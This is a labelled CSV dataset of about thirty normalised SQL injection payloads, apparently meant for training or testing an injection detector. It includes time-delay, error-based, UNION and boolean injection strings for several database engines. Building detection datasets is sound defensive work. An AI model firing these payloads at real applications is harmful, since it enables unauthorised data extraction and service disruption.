row_index,payload_norm,label,sqli_type_hint
5160,"1 ) ) as sxhg where 7697 = 7697 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5161,1' in boolean mode ) and 5725 = 5552#,1,
5162,1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
5163,"1"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""nzhj"" like ""nzhj",1,
5164,"1%' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( '%' = '",1,
5165,1'|| ( select 'ucxp' where 6612 = 6612 order by 1--,1,
5166,"-3452%' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",1,
5167,"1 ) where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
5168,"1"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""vhmc"" = ""vhmc",1,
5169,"1%"" and make_set ( 8403 = 8403,8899 ) and ""%"" = """,1,
5170,"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""ijop"" = ""ijop",1,
5171,"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5172,-9197' ) or ( 6877 = 8010 ) *8010 and ( 'umwl' = 'umwl,1,
5173,"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'nlfl' like 'nlfl",1,
5174,-9509' ) ) ) or 1091 = 5477 and ( ( ( 'gsmz' = 'gsmz,1,
5175,"1"" ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""lide"" = ""lide",1,
5176,1 ) where 4600 = 4600 or sleep ( 5 ) --,1,
5177,1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,1,
5178,"-1763"" ) or elt ( 1032 = 1032,3623 ) and ( ""nqvv"" = ""nqvv",1,
5179,( select ( case when ( 6783 = 6783 ) then 1 else 1/ ( select 0 ) end ) ),1,
5180,1 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
5181,1' ) ) as lkse where 9951 = 9951,1,
5182,"1' ) ) union all select null,null#",1,
5183,select ( case when ( 8841 = 9675 ) then 8841 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
5184,1%' ) union all select null#,1,
5185,"-4419%"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
5186,"1"" ) ) as ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
5187,"1"" union all select null--",1,
5188,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""azzv"" like ""azzv",1,
5189,"1' ) union all select null,null,null,null#",1,
